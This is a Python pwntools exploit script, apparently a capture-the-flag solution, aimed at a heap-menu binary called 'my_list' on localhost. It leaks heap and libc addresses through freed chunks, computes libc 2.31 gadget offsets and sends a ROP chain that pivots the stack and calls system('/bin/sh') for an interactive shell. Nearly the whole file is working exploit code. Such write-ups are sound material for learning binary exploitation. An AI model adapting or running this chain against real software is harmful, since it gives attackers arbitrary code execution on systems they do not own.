#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './my_list'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}
libc = ELF('./libc-2.31.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def add(data):
    io.sendlineafter("Enter your choice: ", "1")
    io.sendlineafter("save: ", data)

def pop():
    io.sendlineafter("Enter your choice: ", "2")

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

for i in range(0x8):
    add("A"*0x100)

for i in range(0x7):
    pop()

io.recvuntil("Data: ")

heap_leak = io.recvline()[:6]
heap_leak = u64(heap_leak.ljust(0x8, b"\x00"))

print(hex(heap_leak))

pop()

io.recvuntil("Data: ")

libc_leak = io.recvline()[:6]
libc_leak = u64(libc_leak.ljust(0x8, b"\x00"))

libc.address = libc_leak - 0x1ecbe0

print(hex(libc.address))

add_rsp_0x58 = libc.address + 0x10fbc5

buf = p64(add_rsp_0x58)*2

print(hex(libc.sym['system']))

add(buf)

pop_rdi_ret = libc.address + 0x23b72

bin_sh = next(libc.search(b"/bin/sh"))

buf = b"A"*0x10
buf += p64(pop_rdi_ret)
buf += p64(bin_sh)
buf += p64(libc.sym['system'])
buf = buf.ljust(0x40, b"\x00")
buf += p64(heap_leak - 0x28)

io.sendlineafter("choice: ", buf)

add("a")

io.interactive()

